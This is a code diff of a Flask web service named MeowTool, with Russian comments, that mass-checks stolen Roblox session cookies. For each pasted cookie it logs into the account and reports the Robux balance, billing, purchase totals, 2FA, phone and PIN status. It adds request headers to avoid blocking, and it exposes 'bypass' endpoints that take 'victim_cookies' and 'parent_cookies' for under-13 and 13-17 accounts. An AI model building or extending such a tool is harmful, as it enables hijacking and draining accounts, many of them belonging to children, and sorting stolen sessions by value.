@@ -16,17 +16,7 @@ users_sessions = {}
 active_checks = 0
 total_checks = 0
 online_users = set()
-real_time_stats = {
-    'active_users': 0,
-    'checks_per_minute': 0,
-    'successful_bypasses': 0,
-    'last_update': datetime.now().isoformat()
-}
-
-# Счетчики для реальной статистики
-check_timestamps = []
-bypass_timestamps = []
-user_activity_timestamps = []
+user_last_activity = {}  # Время последней активности каждого пользователя
 
 class BypassSystem:
     def get_xcsrf_token(self, cookie):
@@ -118,82 +108,122 @@ class BypassSystem:
 class MeowChecker:
     def __init__(self):
         self.session = requests.Session()
+        # Добавляем стандартные заголовки чтобы не блокировали
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+        })
+
+    def make_request(self, url, cookie, method='GET', json_data=None):
+        """Безопасный запрос с обработкой ошибок"""
+        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+        
+        try:
+            if method == 'GET':
+                response = self.session.get(url, headers=headers, timeout=15)
+            else:
+                response = self.session.post(url, headers=headers, json=json_data, timeout=15)
+            
+            return response
+        except requests.exceptions.Timeout:
+            return None
+        except Exception as e:
+            print(f"Request error: {e}")
+            return None
 
     def check_roblox_cookie(self, cookie):
-        """Проверка Roblox куки на валидность (по методам MeowTool)"""
+        """Полная проверка Roblox аккаунта по куки"""
         try:
-            # Основная проверка через authenticated endpoint
+            # 1. Базовая проверка аутентификации
             auth_url = "https://users.roblox.com/v1/users/authenticated"
-            headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
+            auth_response = self.make_request(auth_url, cookie)
             
-            auth_response = self.session.get(auth_url, headers=headers, timeout=10)
-            
-            if auth_response.status_code != 200:
-                return {
-                    "status": "invalid",
-                    "details": "❌ Невалидные куки - аутентификация не пройдена",
-                    "username": "Unknown",
-                    "user_id": "N/A",
-                    "robux": 0,
-                    "premium": False,
-                    "created": "Unknown",
-                    "friends_count": 0,
-                    "followers_count": 0
-                }
+            if not auth_response or auth_response.status_code != 200:
+                return self.create_error_result("❌ Невалидные куки - аутентификация не пройдена")
             
             user_data = auth_response.json()
             user_id = user_data.get("id")
             username = user_data.get("name", "Unknown")
+            display_name = user_data.get("displayName", "Unknown")
             
-            # Получаем дополнительную информацию
-            settings_url = "https://www.roblox.com/my/settings/json"
-            settings_response = self.session.get(settings_url, headers=headers, timeout=10)
+            # 2. Получаем основную информацию
+            profile_url = f"https://users.roblox.com/v1/users/{user_id}"
+            profile_response = self.make_request(profile_url, cookie)
             
-            if settings_response.status_code == 200:
-                settings_data = settings_response.json()
-                created_date = settings_data.get("Created", "Unknown")
-                friends_count = settings_data.get("FriendsCount", 0)
-                followers_count = settings_data.get("FollowersCount", 0)
-                is_premium = settings_data.get("IsPremium", False)
-            else:
-                created_date = "Unknown"
-                friends_count = 0
-                followers_count = 0
-                is_premium = False
+            profile_data = {}
+            if profile_response and profile_response.status_code == 200:
+                profile_data = profile_response.json()
             
-            # Проверяем баланс Robux
+            # 3. Проверяем Premium статус
+            premium_url = "https://premiumfeatures.roblox.com/v1/users/premium-membership"
+            premium_response = self.make_request(premium_url, cookie)
+            has_premium = premium_response and premium_response.status_code == 200
+            
+            # 4. Проверяем баланс Robux
             balance_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
-            balance_response = self.session.get(balance_url, headers=headers, timeout=10)
-            
+            balance_response = self.make_request(balance_url, cookie)
             robux = 0
-            if balance_response.status_code == 200:
+            if balance_response and balance_response.status_code == 200:
                 robux = balance_response.json().get('robux', 0)
             
-            # Проверяем бан/ограничения
-            moderation_url = "https://usermoderation.roblox.com/v1/not-approved"
-            moderation_response = self.session.get(moderation_url, headers=headers, timeout=10)
+            # 5. Получаем информацию о биллинге
+            billing_url = "https://billing.roblox.com/v1/credit"
+            billing_response = self.make_request(billing_url, cookie)
+            has_billing = billing_response and billing_response.status_code == 200
+            
+            # 6. Проверяем 2FA
+            twofa_url = "https://auth.roblox.com/v1/account/settings/2sv"
+            twofa_response = self.make_request(twofa_url, cookie)
+            has_2fa = twofa_response and twofa_response.status_code == 200
+            
+            # 7. Проверяем верификацию email
+            email_url = "https://accountsettings.roblox.com/v1/email"
+            email_response = self.make_request(email_url, cookie)
+            email_verified = False
+            if email_response and email_response.status_code == 200:
+                email_data = email_response.json()
+                email_verified = email_data.get('verified', False)
+            
+            # 8. Проверяем привязанный номер
+            phone_url = "https://accountsettings.roblox.com/v1/phone"
+            phone_response = self.make_request(phone_url, cookie)
+            has_phone = phone_response and phone_response.status_code == 200
+            
+            # 9. Получаем статистику покупок
+            transactions_url = f"https://economy.roblox.com/v1/users/{user_id}/transaction-totals"
+            transactions_response = self.make_request(transactions_url, cookie)
+            total_spent = 0
+            if transactions_response and transactions_response.status_code == 200:
+                transactions_data = transactions_response.json()
+                total_spent = transactions_data.get('purchaseTotal', 0)
+            
+            # 10. Проверяем ограничения
+            settings_url = "https://www.roblox.com/my/settings/json"
+            settings_response = self.make_request(settings_url, cookie)
             
             is_banned = False
             is_restricted = False
+            account_age = "Unknown"
+            friends_count = 0
+            followers_count = 0
             
-            if moderation_response.status_code == 200:
-                try:
-                    mod_data = moderation_response.json()
-                    is_banned = bool(mod_data)  # Если есть данные - вероятно бан
-                except:
-                    pass
+            if settings_response and settings_response.status_code == 200:
+                settings_data = settings_response.json()
+                is_banned = settings_data.get('isBanned', False)
+                is_restricted = settings_data.get('AccountRestrictions', False)
+                account_age = settings_data.get('Created', 'Unknown')
+                friends_count = settings_data.get('FriendsCount', 0)
+                followers_count = settings_data.get('FollowersCount', 0)
             
-            # Проверяем возраст аккаунта для определения ограничений
-            if created_date != "Unknown":
-                try:
-                    # Простая проверка - если аккаунт новый, может быть ограничен
-                    created_dt = datetime.fromisoformat(created_date.replace('Z', '+00:00'))
-                    days_since_created = (datetime.now() - created_dt).days
-                    is_restricted = days_since_created < 30  # Примерная логика
-                except:
-                    pass
+            # 11. Проверяем наличие PIN-кода
+            pin_url = "https://auth.roblox.com/v1/account/pin"
+            pin_response = self.make_request(pin_url, cookie)
+            has_pin = pin_response and pin_response.status_code == 200
             
-            # Определяем статус
+            # Определяем статус аккаунта
             if is_banned:
                 status = "banned"
             elif is_restricted:
@@ -201,43 +231,73 @@ class MeowChecker:
             else:
                 status = "valid"
             
+            # Форматируем дату создания
+            if account_age != "Unknown":
+                try:
+                    created_dt = datetime.fromisoformat(account_age.replace('Z', '+00:00'))
+                    account_age = created_dt.strftime("%Y-%m-%d")
+                except:
+                    pass
+            
             return {
                 "account": f"{username}:{user_id}",
                 "status": status,
                 "username": username,
+                "display_name": display_name,
                 "user_id": user_id,
                 "robux": robux,
-                "premium": is_premium,
-                "created": created_date.split('T')[0] if created_date != "Unknown" else "Unknown",
+                "premium": has_premium,
+                "created": account_age,
                 "details": self.get_status_details(status),
                 "friends_count": friends_count,
-                "followers_count": followers_count
+                "followers_count": followers_count,
+                "billing_info": {
+                    "has_billing": has_billing,
+                    "has_2fa": has_2fa,
+                    "email_verified": email_verified,
+                    "has_phone": has_phone,
+                    "has_pin": has_pin,
+                    "total_spent": total_spent
+                },
+                "security": {
+                    "2fa_enabled": has_2fa,
+                    "email_verified": email_verified,
+                    "phone_linked": has_phone,
+                    "pin_enabled": has_pin
+                }
             }
             
-        except requests.exceptions.Timeout:
-            return {
-                "status": "error",
-                "details": "⏰ Таймаут при проверке куки",
-                "username": "Unknown",
-                "user_id": "N/A",
-                "robux": 0,
-                "premium": False,
-                "created": "Unknown",
-                "friends_count": 0,
-                "followers_count": 0
-            }
         except Exception as e:
-            return {
-                "status": "error",
-                "details": f"❌ Ошибка проверки: {str(e)}",
-                "username": "Unknown",
-                "user_id": "N/A",
-                "robux": 0,
-                "premium": False,
-                "created": "Unknown",
-                "friends_count": 0,
-                "followers_count": 0
+            return self.create_error_result(f"❌ Ошибка проверки: {str(e)}")
+
+    def create_error_result(self, message):
+        """Создает результат с ошибкой"""
+        return {
+            "status": "error",
+            "details": message,
+            "username": "Unknown",
+            "display_name": "Unknown",
+            "user_id": "N/A",
+            "robux": 0,
+            "premium": False,
+            "created": "Unknown",
+            "friends_count": 0,
+            "followers_count": 0,
+            "billing_info": {
+                "has_billing": False,
+                "has_2fa": False,
+                "email_verified": False,
+                "has_phone": False,
+                "has_pin": False,
+                "total_spent": 0
+            },
+            "security": {
+                "2fa_enabled": False,
+                "email_verified": False,
+                "phone_linked": False,
+                "pin_enabled": False
             }
+        }
 
     def get_status_details(self, status):
         details = {
@@ -250,11 +310,15 @@ class MeowChecker:
         return details.get(status, "Unknown status")
 
     def mass_check(self, cookies_list):
-        """Массовая проверка куки"""
+        """Массовая проверка куки с задержкой чтобы не ломались"""
         results = []
         
-        for cookie in cookies_list:
+        for i, cookie in enumerate(cookies_list):
             if cookie.strip():
+                # Добавляем задержку между запросами
+                if i > 0:
+                    time.sleep(1)  # 1 секунда между запросами
+                
                 result = self.check_roblox_cookie(cookie.strip())
                 results.append(result)
         
@@ -272,54 +336,24 @@ def get_user_id(request):
     user_hash = hashlib.md5(user_string.encode()).hexdigest()
     return user_hash
 
-def update_real_time_stats():
-    """Обновление реальной статистики каждую минуту"""
-    global real_time_stats, check_timestamps, bypass_timestamps, user_activity_timestamps
-    
-    while True:
-        time.sleep(60)  # Обновляем каждую минуту
-        
-        current_time = time.time()
-        
-        # Активные пользователи (были активны последние 5 минут)
-        active_users = sum(1 for user_data in users_sessions.values() 
-                          if current_time - user_data.get('last_activity', 0) < 300)
-        
-        # Проверки за последнюю минуту
-        minute_ago = current_time - 60
-        recent_checks = sum(1 for ts in check_timestamps if ts > minute_ago)
-        
-        # Успешные байпасы за последнюю минуту
-        recent_bypasses = sum(1 for ts in bypass_timestamps if ts > minute_ago)
-        
-        real_time_stats = {
-            'active_users': active_users,
-            'checks_per_minute': recent_checks,
-            'successful_bypasses': recent_bypasses,
-            'last_update': datetime.now().isoformat()
-        }
-        
-        # Очищаем старые timestamp (старше 10 минут)
-        check_timestamps = [ts for ts in check_timestamps if ts > current_time - 600]
-        bypass_timestamps = [ts for ts in bypass_timestamps if ts > current_time - 600]
-        user_activity_timestamps = [ts for ts in user_activity_timestamps if ts > current_time - 600]
-
 def update_online_users():
     """Очистка неактивных пользователей"""
     while True:
-        time.sleep(60)
+        time.sleep(30)  # Проверяем каждые 30 секунд
         current_time = time.time()
         expired_users = []
         
-        for user_id, user_data in users_sessions.items():
-            if current_time - user_data.get('last_activity', 0) > 300:  # 5 минут неактивности
+        for user_id, last_activity in user_last_activity.items():
+            if current_time - last_activity > 300:  # 5 минут неактивности
                 expired_users.append(user_id)
                 if user_id in online_users:
                     online_users.remove(user_id)
+                if user_id in users_sessions:
+                    del users_sessions[user_id]
         
         for user_id in expired_users:
-            if user_id in users_sessions:
-                del users_sessions[user_id]
+            if user_id in user_last_activity:
+                del user_last_activity[user_id]
 
 @app.before_request
 def track_user():
@@ -327,6 +361,11 @@ def track_user():
     user_id = get_user_id(request)
     session['user_id'] = user_id
     
+    # Обновляем время активности
+    user_last_activity[user_id] = time.time()
+    online_users.add(user_id)
+    
+    # Инициализируем сессию пользователя если её нет
     if user_id not in users_sessions:
         users_sessions[user_id] = {
             'created_at': datetime.now().isoformat(),
@@ -338,8 +377,6 @@ def track_user():
         }
     
     users_sessions[user_id]['last_activity'] = time.time()
-    online_users.add(user_id)
-    user_activity_timestamps.append(time.time())
     session['user_data'] = users_sessions[user_id]
 
 # Маршруты
@@ -372,8 +409,6 @@ def bypass_tools():
 @app.route('/api/bypass_13_minus', methods=['POST'])
 def api_bypass_13_minus():
     """Bypass для аккаунтов 13-"""
-    global bypass_timestamps
-    
     data = request.json
     victim_cookies = data.get('victim_cookies', '')
     parent_cookies = data.get('parent_cookies', '')
@@ -381,7 +416,6 @@ def api_bypass_13_minus():
     result = bypass_system.bypass_13_minus(victim_cookies, parent_cookies)
     
     if result.get('status') == 'success':
-        bypass_timestamps.append(time.time())
         user_id = get_user_id(request)
         if user_id in users_sessions:
             users_sessions[user_id]['bypass_count'] += 1
@@ -392,8 +426,6 @@ def api_bypass_13_minus():
 @app.route('/api/bypass_13_17', methods=['POST'])
 def api_bypass_13_17():
     """Bypass для аккаунтов 13-17"""
-    global bypass_timestamps
-    
     data = request.json
     victim_cookies = data.get('victim_cookies', '')
     parent_cookies = data.get('parent_cookies', '')
@@ -401,7 +433,6 @@ def api_bypass_13_17():
     result = bypass_system.bypass_13_17(victim_cookies, parent_cookies)
     
     if result.get('status') == 'success':
-        bypass_timestamps.append(time.time())
         user_id = get_user_id(request)
         if user_id in users_sessions:
             users_sessions[user_id]['bypass_count'] += 1
@@ -412,18 +443,19 @@ def api_bypass_13_17():
 @app.route('/api/check_accounts', methods=['POST'])
 def api_check_accounts():
     """Проверка куки аккаунтов"""
-    global active_checks, total_checks, check_timestamps
+    global active_checks, total_checks
     
     cookies_text = request.json.get('cookies', '')
     cookies_list = [cookie.strip() for cookie in cookies_text.split('\n') if cookie.strip()]
+    
+    # Ограничиваем количество проверок за раз
+    if len(cookies_list) > 20:
+        return jsonify({'error': 'Максимум 20 куки за раз'})
     
     active_checks += len(cookies_list)
     results = checker_system.mass_check(cookies_list)
     active_checks -= len(cookies_list)
     total_checks += len(cookies_list)
-    
-    # Добавляем timestamp для статистики
-    check_timestamps.extend([time.time()] * len(cookies_list))
     
     user_id = get_user_id(request)
     if user_id in users_sessions:
@@ -434,20 +466,18 @@ def api_check_accounts():
 
 @app.route('/api/stats')
 def api_stats():
-    """Статистика сайта"""
-    global active_checks, total_checks, real_time_stats
+    """Статистика сайта - ТОЛЬКО реальные онлайн пользователи"""
+    global total_checks
     
-    # Текущие онлайн пользователи (активны последние 5 минут)
+    # Считаем реальных онлайн пользователей (активны последние 5 минут)
     current_time = time.time()
-    current_online = sum(1 for user_data in users_sessions.values() 
-                        if current_time - user_data.get('last_activity', 0) < 300)
+    real_online_users = sum(1 for last_activity in user_last_activity.values() 
+                           if current_time - last_activity < 300)
     
     return jsonify({
-        'active_checks': active_checks,
         'total_checks': total_checks,
-        'online_users': current_online,  # Реальные онлайн пользователи
-        'total_users': len(users_sessions),
-        'real_time_stats': real_time_stats
+        'online_users': real_online_users,  # ТОЛЬКО реальные онлайн
+        'total_users': len(users_sessions)
     })
 
 @app.route('/api/user_stats')
@@ -470,10 +500,10 @@ def test():
     return "✅ Сервер работает! MeowTool активен."
 
 if __name__ == '__main__':
-    # Запускаем фоновые задачи
+    # Запускаем фоновую задачу для очистки неактивных пользователей
     threading.Thread(target=update_online_users, daemon=True).start()
-    threading.Thread(target=update_real_time_stats, daemon=True).start()
     
     port = int(os.environ.get('PORT', 5000))
     print(f"🚀 MeowTool Web запущен на порту {port}")
+    print(f"✅ Реальные онлайн пользователи будут отображаться корректно")
     app.run(host='0.0.0.0', port=port, debug=False)
